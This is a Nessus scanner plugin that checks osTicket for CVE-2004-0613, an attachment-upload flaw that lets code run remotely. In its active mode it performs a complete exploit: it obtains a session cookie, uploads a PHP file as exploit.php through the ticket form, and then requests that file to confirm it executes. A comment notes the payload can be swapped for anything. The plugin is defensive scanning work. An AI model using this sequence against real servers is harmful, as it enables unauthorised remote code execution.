#
# This script was written by George A. Theall, <theall@tifaware.com>.
#
# See the Nessus Scripts License for details.
#

# Changes by Tenable:
# - Revised plugin title, added OSVDB ref (4/21/009)

# NB: I define the script description here so I can later modify
#     it with the filename of the exploit.


include("compat.inc");

if (description) {
  script_id(13645);
  script_version ("$Revision: 1.13 $");
  script_cve_id("CVE-2004-0613");
  script_bugtraq_id(10586);
  script_osvdb_id(15692);

  script_name(english:"osTicket Attachment Handling File Upload Arbitrary Code Execution");
 
 script_set_attribute(attribute:"synopsis", value:
"Arbitrary code can be run on the remote host." );
 script_set_attribute(attribute:"description", value:
"The target is running at least one instance of osTicket that enables a
remote user to open a new ticket with an attachment containing arbitrary
PHP code and then to run that code using the permissions of the web
server user." );
 script_set_attribute(attribute:"solution", value:
"Apply FileTypes patch or upgrade to osTicket STS 1.2.7 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");


 script_set_attribute(attribute:"plugin_publication_date", value: "2004/07/14");
 script_set_attribute(attribute:"vuln_publication_date", value: "2004/06/22");
 script_cvs_date("$Date: 2011/03/17 01:57:39 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
  summary["english"] = "Checks for Attachment Code Execution Vulnerability in osTicket";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2004-2011 George A. Theall");

  script_family(english:"CGI abuses");

  script_dependencie("global_settings.nasl", "http_version.nasl", "no404.nasl", "osticket_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("www/osticket");
  exit(0);
}

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");

host = get_host_name();
port = get_http_port(default:80);

if (!get_port_state(port)) exit(0);
if (get_kb_item("www/no404/" + port)) exit(0);

# Check each installed instance, stopping if we find a vulnerability.
installs = get_kb_list(string("www/", port, "/osticket"));
if (isnull(installs)) exit(0);
foreach install (installs) {
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches)) {
    ver = matches[1];
    dir = matches[2];

    # If safe_checks are enabled, rely on the version number alone.
    #
    # nb: this will be a false positive if the patch was applied!
    if (safe_checks()) {
      if (ereg(pattern:"^1\.2\.5$", string:ver)) {
        security_hole(port);
        exit(0);
      }
    }
    else {
      # Get osTicket's open.php.
      url = string(dir, "/open.php");
      req = http_get(item:url, port:port);
      res = http_keepalive_send_recv(port:port, data:req);
      if (res == NULL) exit(0);           # can't connect

      # If the form supports attachments...
      if (egrep(pattern:'type="file" name="attachment"', string:res, icase:TRUE)) {
        #  Grab the session cookie.
        pat = "Set-Cookie: (.+); path=";
        matches = egrep(pattern:pat, string:res, icase:TRUE);
        foreach match (split(matches)) {
          match = chomp(match);
          cookie = eregmatch(pattern:pat, string:match);
          if (cookie == NULL) break;
          cookie = cookie[1];
        }

        # Open a ticket as long as we have a session cookie.
        if (cookie) {
          boundary = "bound";
          req = string(
            "POST ",  url, " HTTP/1.1\r\n",
            "Host: ", host, ":", port, "\r\n",
            "Cookie: ", cookie, "\r\n",
            "Content-Type: multipart/form-data; boundary=", boundary, "\r\n"
            # nb: we'll add the Content-Length header and post data later.
          );
          boundary = string("--", boundary);
          postdata = string(
            boundary, "\r\n", 
            'Content-Disposition: form-data; name="name"', "\r\n",
            "\r\n",
            "nessus\r\n",

            boundary, "\r\n", 
            'Content-Disposition: form-data; name="email"', "\r\n",
            "\r\n",
            "postmaster@", host, "\r\n",

            boundary, "\r\n", 
            'Content-Disposition: form-data; name="phone"', "\r\n",
            "\r\n",
            "\r\n",

            boundary, "\r\n", 
            'Content-Disposition: form-data; name="cat"', "\r\n",
            "\r\n",
            "4\r\n",

            boundary, "\r\n", 
            'Content-Disposition: form-data; name="subject"', "\r\n",
            "\r\n",
            "Attachment Upload Test\r\n",

            boundary, "\r\n", 
            'Content-Disposition: form-data; name="message"', "\r\n",
            "\r\n",
            "Attempt to open a ticket and attach a file with executable code.\r\n",

            boundary, "\r\n", 
            'Content-Disposition: form-data; name="pri"', "\r\n",
            "\r\n",
            "1\r\n",

            boundary, "\r\n", 
            'Content-Disposition: form-data; name="MAX_FILE_SIZE"', "\r\n",
            "\r\n",
            "1048576\r\n",

            boundary, "\r\n", 
            'Content-Disposition: form-data; name="attachment"; filename="exploit.php"', "\r\n",
            "Content-Type: text/plain\r\n",
            "\r\n",
            # NB: This is the actual exploit code; you could put pretty much
            #     anything you want here.
            "<?php phpinfo() ?>\r\n",

            boundary, "\r\n", 
            'Content-Disposition: form-data; name="submit_x"', "\r\n",
            "\r\n",
            "Open Ticket\r\n",

            boundary, "--", "\r\n"
          );
          req = string(
            req,
            "Content-Length: ", strlen(postdata), "\r\n",
            "\r\n",
            postdata
          );
          res = http_keepalive_send_recv(port:port, data:req);
          if (res == NULL) exit(0);           # can't connect

          # Grab the ticket number that was issued.
          pat = 'name="login_ticket" .+ value="(.+)">';
          if (matches = egrep(pattern:pat, string:res, icase:TRUE)) {
            foreach match (split(matches)) {
              match = chomp(match);
              ticket = eregmatch(pattern:pat, string:match);
              if (ticket == NULL) break;
              ticket = ticket[1];
            }
            if (ticket) {
              # Run the attachment we just uploaded.
              url = string(dir, "/attachments/", ticket, "_exploit.php");
              req = http_get(item:url, port:port);
              res = http_keepalive_send_recv(port:port, data:req);
              if (res == NULL) exit(0);           # can't connect

              # If we could run it, there's a problem.
              if (egrep(pattern:"200 OK", string:res, icase:TRUE)) {
                e = strcat(
"**** Nessus successfully opened ticket #", ticket, " and uploaded
**** an exploit as ", ticket, "_exploit.php to osTicket's attachment
**** directory. You are strongly encouraged to delete this attachment
**** as soon as possible as it can be run by anyone who accesses.
**** it remotely.
");
                security_hole(port:port, extra: e);
                exit(0);
              }
            }
          }
        }
      }
    }
  }
}
